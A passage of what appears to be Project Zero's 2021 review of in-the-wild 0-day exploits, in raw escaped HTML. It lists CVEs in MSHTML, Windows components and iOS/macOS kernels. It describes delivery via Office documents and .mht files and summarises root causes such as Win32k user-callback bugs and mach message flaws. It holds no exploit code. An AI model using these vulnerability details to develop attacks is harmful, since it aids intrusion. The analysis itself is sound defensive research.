src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjbMTlnGhVLcVL8K20S3s6hSrpyB6kZAA9CWvWNpn1isbEbLFv0c2rs_dPvM0ALT45NtTvyhp8rGehGDRIAEJ6OZYSkk5mezOEoPJOquVXXyHeqrVOvRGEiQHv_J7Je8Itjc5qhwXMCR-E4y79abuxiddCYoeF2VrVakY-L1q82NeMEPjTA0fFC-t8h/s1200/image4%286%29.png\" border=\"0\" alt=\"Bar graph showing the number of Internet Explorer itw 0-days discovered per year from 2015-2021. 2015: 3, 2016: 4, 2017: 3, 2018: 1, 2019: 3, 2020: 2, 2021: 4. Data from: https://docs.google.com/spreadsheets/d/1lkNJ0uQwbeC1ZTRrxdtuPLCIl7mlUreoKfSIgajnSyY/edit#gid=2129022708\" style=\"max-height: 750; max-width: 600px;\"title=\"Bar graph showing the number of Internet Explorer itw 0-days discovered per year from 2015-2021. 2015: 3, 2016: 4, 2017: 3, 2018: 1, 2019: 3, 2020: 2, 2021: 4. Data from: https://docs.google.com/spreadsheets/d/1lkNJ0uQwbeC1ZTRrxdtuPLCIl7mlUreoKfSIgajnSyY/edit#gid=2129022708\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;So why are we seeing so little change in the number of in-the-wild 0-days despite the change in market share? Internet Explorer is still a ripe attack surface for initial entry into Windows machines, even if the user doesn&amp;rsquo;t use Internet Explorer as their Internet browser. While the number of 0-days stayed pretty consistent to what we&amp;rsquo;ve seen in previous years, the components targeted and the delivery methods of the exploits changed. 3 of the 4 0-days seen in 2021 targeted the MSHTML browser engine and were delivered via methods other than the web. Instead they were delivered to targets via Office documents or other file formats. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;The four 0-days targeted the following components:&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"padding: 0;\" class=\"c6 lst-kix_bqyk3pvm93qj-0 start\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 li-bullet-0\"&gt;&lt;span&gt;MSHTML browser engine (&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-26411.html\"&gt;CVE-2021-26411&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2021/CVE-2021-33742.html\"&gt;CVE-2021-33742&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444\"&gt;CVE-2021-40444&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 li-bullet-0\"&gt;&lt;span&gt;Javascript Engine - JScript9 (&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34448\"&gt;CVE-2021-34448&lt;/a&gt;&lt;/span&gt;&lt;span&gt;)&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span&gt;For &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-26411.html\"&gt;CVE-2021-26411&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;t&lt;/span&gt;&lt;span&gt;argets of the campaign initially received a &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c10\"&gt;.mht&lt;/span&gt;&lt;span&gt;&amp;nbsp;file, which prompted the user to open in Internet Explorer. Once it was opened in Internet Explorer, the exploit was downloaded and run. &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-33742.html\"&gt;CVE-2021-33742&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444\"&gt;CVE-2021-40444&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&amp;nbsp;were delivered to targets via malicious Office documents.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-26411.html\"&gt;CVE-2021-26411&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-33742.html\"&gt;CVE-2021-33742&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;were two common memory corruption bug patterns: a use-after-free due to a user controlled callback in between two actions using an object and the user frees the object during that callback and a buffer overflow.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span&gt;There were a few different vulnerabilities used in the exploit chain that used &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444\"&gt;CVE-2021-40444&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, but the one within MSHTML was that as soon as the Office document was opened the payload would run: a CAB file was downloaded, decompressed, and then a function from within a DLL in that CAB was executed. Unlike the previous two MSHTML bugs, this was a logic error in URL parsing rather than a memory corruption bug.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"HNYIspzEBn-c7\" id=\"h.i2yh4xx4r7n0\"&gt;&lt;span class=\"HNYIspzEBn-c12\"&gt;Windows&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;Windows is the platform where we&amp;rsquo;ve seen the most change in components targeted compared with previous years. However, this shift has generally been in progress for a few years and predicted with the end-of-life of Windows 7 in 2020 and thus why it&amp;rsquo;s still not especially novel.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;In 2021 there were 10 Windows in-the-wild 0-days targeting 7 different components:&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"padding: 0;\" class=\"c6 lst-kix_rvy0q9fw47sg-0 start\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 li-bullet-0\"&gt;&lt;span&gt;2 Enhanced crypto provider (&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31199\"&gt;CVE-2021-31199&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31201\"&gt;CVE-2021-31201&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 li-bullet-0\"&gt;&lt;span&gt;2 NTOS kernel (&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-33771\"&gt;CVE-2021-33771&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31979\"&gt;CVE-2021-31979&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 li-bullet-0\"&gt;&lt;span&gt;2 Win32k (&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-1732.html\"&gt;CVE-2021-1732&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://securelist.com/mysterysnail-attacks-with-windows-zero-day/104509/\"&gt;CVE-2021-40449&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 li-bullet-0\"&gt;&lt;span&gt;1 Windows update medic (&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36948\"&gt;CVE-2021-36948&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;) &lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 li-bullet-0\"&gt;&lt;span&gt;1 SuperFetch (&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31955\"&gt;CVE-2021-31955&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 li-bullet-0\"&gt;&lt;span&gt;1 dwmcore.dll (&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-28310\"&gt;CVE-2021-28310&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;ul style=\"padding: 0;\" class=\"c6 lst-kix_718o7hzyu4f-0 start\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 li-bullet-0\"&gt;&lt;span&gt;1 ntfs.sys (&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31956\"&gt;CVE-2021-31956&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;The number of different components targeted is the shift from past years. For example, in 2019 75% of Windows 0-days targeted Win32k while in 2021 Win32k only made up 20% of the Windows 0-days. The reason that this was expected and predicted was that 6 out of 8 of those 0-days that targeted Win32k in 2019 did not target the latest release of Windows 10 at that time; they were targeting older versions. With Windows 10 Microsoft began dedicating more and more resources to locking down the attack surface of Win32k so as those older versions have hit end-of-life, Win32k is a less and less attractive attack surface.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span&gt;Similar to the many Win32k vulnerabilities seen over the years, the &lt;/span&gt;&lt;span&gt;two 2021 Win32k in-the-wild 0-days are due to custom user callbacks&lt;/span&gt;&lt;span&gt;. The user calls functions that change the state of an object during the callback and Win32k does not correctly handle those changes. &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-1732.html\"&gt;CVE-2021-1732&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;is a type confusion vulnerability due to a user callback in &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c10\"&gt;xxxClientAllocWindowClassExtraBytes&lt;/span&gt;&lt;span&gt;&amp;nbsp;which leads to out-of-bounds read and write. If &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c10\"&gt;NtUserConsoleControl&lt;/span&gt;&lt;span&gt;&amp;nbsp;is called during the callback a flag is set in the window structure to signal that a field is an offset into the kernel heap. &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c10\"&gt;xxxClientAllocWindowClassExtraBytes&lt;/span&gt;&lt;span&gt;&amp;nbsp;doesn&amp;rsquo;t check this and writes that field as a user-mode pointer without clearing the flag. The first in-the-wild 0-day detected and disclosed in 2022, &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2022/CVE-2022-21882.html\"&gt;CVE-2022-21882&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, is due to &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-1732.html\"&gt;CVE-2021-1732&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;actually not being fixed completely. The attackers found a way to bypass the original patch and still trigger the vulnerability. &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://securelist.com/mysterysnail-attacks-with-windows-zero-day/104509/\"&gt;CVE-2021-40449&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;is a use-after-free in &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c10\"&gt;NtGdiResetDC&lt;/span&gt;&lt;span&gt;&amp;nbsp;due to the object being freed during the user callback. &lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"HNYIspzEBn-c7\" id=\"h.dzyrqam42oqk\"&gt;&lt;span class=\"HNYIspzEBn-c12\"&gt;iOS/macOS&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span&gt;As discussed in the &amp;ldquo;More disclosure&amp;rdquo; section above, 2021 was the first full year that Apple annotated their release notes with in-the-wild status of vulnerabilities. 5 iOS in-the-wild 0-days were detected and disclosed this year. The first publicly known macOS in-the-wild 0-day (&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://blog.google/threat-analysis-group/analyzing-watering-hole-campaign-using-macos-exploits/\"&gt;CVE-2021-30869&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;) was also found. In this section we&amp;rsquo;re going to discuss iOS and macOS together because: 1) the two operating systems include similar components and 2) the sample size for macOS is very small (just this one vulnerability).&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhPGaOlQUGIYyvpDY_M0rGh3JekH4mwXHfN459HYcklg74v4Mfp8j6fgh2SM09mjhA4svdgN_TdSN3R5Bb-DJTHnlo63qnRTsvLs1EZgAE3fBpRtsZhxKhyBNTb_khdS6mNT3EtSHnS_R-TshtHx-gSWnEPpHjmSqO_9Y7JxupGcDKZ0-xwsxgbX6zR/s1200/image6%284%29.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhPGaOlQUGIYyvpDY_M0rGh3JekH4mwXHfN459HYcklg74v4Mfp8j6fgh2SM09mjhA4svdgN_TdSN3R5Bb-DJTHnlo63qnRTsvLs1EZgAE3fBpRtsZhxKhyBNTb_khdS6mNT3EtSHnS_R-TshtHx-gSWnEPpHjmSqO_9Y7JxupGcDKZ0-xwsxgbX6zR/s1200/image6%284%29.png\" border=\"0\" alt=\"Bar graph showing the number of macOS and iOS itw 0-days discovered per year. macOs is 0 for every year except 2021 when 1 was discovered. iOS - 2015: 0, 2016: 2, 2017: 0, 2018: 2, 2019: 0, 2020: 3, 2021: 5. Data from: https://docs.google.com/spreadsheets/d/1lkNJ0uQwbeC1ZTRrxdtuPLCIl7mlUreoKfSIgajnSyY/edit#gid=2129022708\" style=\"max-height: 750; max-width: 600px; \"title=\"Bar graph showing the number of macOS and iOS itw 0-days discovered per year. macOs is 0 for every year except 2021 when 1 was discovered. iOS - 2015: 0, 2016: 2, 2017: 0, 2018: 2, 2019: 0, 2020: 3, 2021: 5. Data from: https://docs.google.com/spreadsheets/d/1lkNJ0uQwbeC1ZTRrxdtuPLCIl7mlUreoKfSIgajnSyY/edit#gid=2129022708\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span&gt;For the 5 total iOS and macOS in-the-wild 0-days&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;, they targeted 3 different attack surfaces:&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"padding: 0;\" class=\"c6 lst-kix_givsp5ka59r-0 start\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 li-bullet-0\"&gt;&lt;span&gt;IOMobileFrameBuffer (&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://support.apple.com/en-us/HT212623\"&gt;CVE-2021-30807&lt;/a&gt;&lt;/span&gt;&lt;span&gt;,&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://support.apple.com/en-us/HT212846\"&gt;CVE-2021-30883&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 li-bullet-0\"&gt;&lt;span&gt;XNU Kernel (&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://support.apple.com/en-us/HT212146\"&gt;CVE-2021-1782&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;&amp;amp; &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://blog.google/threat-analysis-group/analyzing-watering-hole-campaign-using-macos-exploits/\"&gt;CVE-2021-30869&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 li-bullet-0\"&gt;&lt;span&gt;CoreGraphics (&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://googleprojectzero.blogspot.com/2021/12/a-deep-dive-into-nso-zero-click.html\"&gt;CVE-2021-30860&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 li-bullet-0\"&gt;&lt;span&gt;CommCenter&lt;/span&gt;&lt;span&gt;&amp;nbsp;(&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://googleprojectzero.blogspot.com/2022/03/forcedentry-sandbox-escape.html\"&gt;FORCEDENTRY sandbox escape&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&amp;nbsp;- CVE requested, not yet assigned)&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span&gt;These 4 attack surfaces are not novel. IOMobileFrameBuffer has been a target of public security research for many years. For example, &lt;/span&gt;&lt;span&gt;the Pangu Jailbreak from 2016 used &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://www.blackhat.com/docs/us-16/materials/us-16-Wang-Pangu-9-Internals.pdf\"&gt;CVE-2016-4654&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, a heap buffer overflow in IOMobileFrameBuffer.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;IOMobileFrameBuffer manages the screen&amp;rsquo;s frame buffer. For iPhone 11 (A13) and below, IOMobileFrameBuffer was a kernel driver. Beginning with A14, it runs on a coprocessor, the DCP. &amp;nbsp;It&amp;rsquo;s a popular attack surface because historically it&amp;rsquo;s been accessible from sandboxed apps. In 2021 there were two in-the-wild 0-days in IOMobileFrameBuffer. &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://support.apple.com/en-us/HT212623\"&gt;CVE-2021-30807&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;is an out-of-bounds read and &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://support.apple.com/en-us/HT212846\"&gt;CVE-2021-30883&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;is an integer overflow, both common memory corruption vulnerabilities. In 2022, we already have another in-the-wild 0-day in IOMobileFrameBuffer, &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://support.apple.com/en-us/HT213053\"&gt;CVE-2022-22587&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span&gt;One iOS 0-day and the macOS 0-day both exploited vulnerabilities in the XNU kernel and both vulnerabilities were in code related to XNU&amp;rsquo;s inter-process communication (IPC) functionality. &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://support.apple.com/en-us/HT212146\"&gt;CVE-2021-1782&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;exploited a vulnerability in mach vouchers while &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://blog.google/threat-analysis-group/analyzing-watering-hole-campaign-using-macos-exploits/\"&gt;CVE-2021-30869&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;exploited a vulnerability in mach messages. This is not the first time we&amp;rsquo;ve seen &lt;/span&gt;&lt;span&gt;iOS in-the-wild 0-days&lt;/span&gt;&lt;span&gt;, much less public security research, targeting mach vouchers and mach messages. &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://support.apple.com/en-us/HT209443\"&gt;CVE-2019-6625&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;was exploited as a part of &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://googleprojectzero.blogspot.com/2019/08/in-wild-ios-exploit-chain-5.html\"&gt;an exploit chain targeting iOS 11.4.1-12.1.2&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and was also a &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://googleprojectzero.blogspot.com/2019/01/voucherswap-exploiting-mig-reference.html\"&gt;vulnerability in mach vouchers&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span&gt;Mach messages have also been a popular target for public security research. In 2020 there were two in-the-wild 0-days also in mach messages: &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2020/CVE-2020-27932.html\"&gt;CVE-2020-27932&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;&amp;amp; &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2020/CVE-2020-27950.html\"&gt;CVE-2020-27950&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. This year&amp;rsquo;s &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://blog.google/threat-analysis-group/analyzing-watering-hole-campaign-using-macos-exploits/\"&gt;CVE-2021-30869&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;is a pretty close variant to 2020&amp;rsquo;s &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2020/CVE-2020-27932.html\"&gt;CVE-2020-27932&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. Tielei Wang and Xinru Chi actually &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://github.com/wangtielei/Slides/blob/main/zer0con21.pdf\"&gt;presented on this vulnerability at zer0con 2021&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;in April 2021. In their presentation, they explained that they found it while doing variant analysis on &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2020/CVE-2020-27932.html\"&gt;CVE-2020-27932&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://twitter.com/WangTielei/status/1486266258152726530\"&gt;TieLei Wang explained via Twitter&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&amp;nbsp;that they had found the vulnerability in December 2020 and had noticed it was fixed in beta versions of iOS 14.4 and macOS 11.2 which is why they presented it at Zer0Con. The in-the-wild exploit only targeted macOS 10, but used the same exploitation 